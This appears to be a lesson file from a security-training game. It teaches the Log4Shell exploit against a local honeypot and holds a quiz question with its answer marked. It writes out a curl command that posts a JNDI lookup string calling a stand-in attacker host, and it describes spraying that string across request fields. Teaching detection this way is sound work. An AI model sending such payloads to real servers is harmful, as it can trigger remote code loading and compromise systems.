@@ -1,0 +1,49 @@
+id = "http-log4shell"
+family = "attack"
+title = "Log4Shell (CVE-2021-44228)"
+blurb = "Post a JNDI lookup string and watch the CVE detector light up."
+ttps = ["T1190"]
+difficulty = "easy"
+typing_model = "cli"
+
+briefing = """
+**MITRE ATT&CK:** T1190 — *Exploit Public-Facing Application*
+
+Log4Shell (CVE-2021-44228) is the December-2021 vulnerability in Apache
+Log4j. Any string of the form `${jndi:ldap://attacker/x}` that reaches a
+vulnerable logger triggers a JNDI lookup — the server reaches out to the
+attacker's LDAP/RMI endpoint and loads a remote class. Game over.
+
+You don't need a vulnerable Log4j to *probe* for it: scanners spray the
+JNDI string into every header and body field and watch for a callback.
+The HoneyStrike HTTP listener recognises the `${jndi:` pattern and sets
+`cve_signature = "CVE-2021-44228"` on the event, which the
+`_exploit_public_app_rule` reads to fire T1190.
+
+We send the payload as a `text/plain` POST body. Type the curl command.
+"""
+
+[live]
+scenario = "http-log4shell"
+default_target = "http-honeypot:80"
+
+[[blocks]]
+kind = "prose"
+text = "The payload wraps a JNDI/LDAP callback in the ${...} interpolation Log4j evaluates. We POST it as the raw body to an API endpoint that would log it."
+
+[[blocks]]
+kind = "shell"
+target = "curl -s -X POST -H 'Content-Type: text/plain' --data-raw '${jndi:ldap://evil.example/a}' http://http-honeypot:80/api/v1/health"
+annotation = "--data-raw keeps the ${...} literal (no shell expansion thanks to single quotes). The honeypot tags cve_signature=CVE-2021-44228 on this request."
+
+[[blocks]]
+kind = "choice"
+prompt = "Why does the attacker put the payload in many different fields (User-Agent, X-Forwarded-For, body, …)?"
+options = [
+  "To make the request bigger",
+  "Because they don't know which field gets passed to a vulnerable logger",
+  "To bypass the firewall",
+  "It's required by the JNDI spec",
+]
+correct = 1
+explanation = "Spray-and-pray: any field that ends up in a log.info() call on a vulnerable Log4j triggers the lookup, so scanners hit them all."
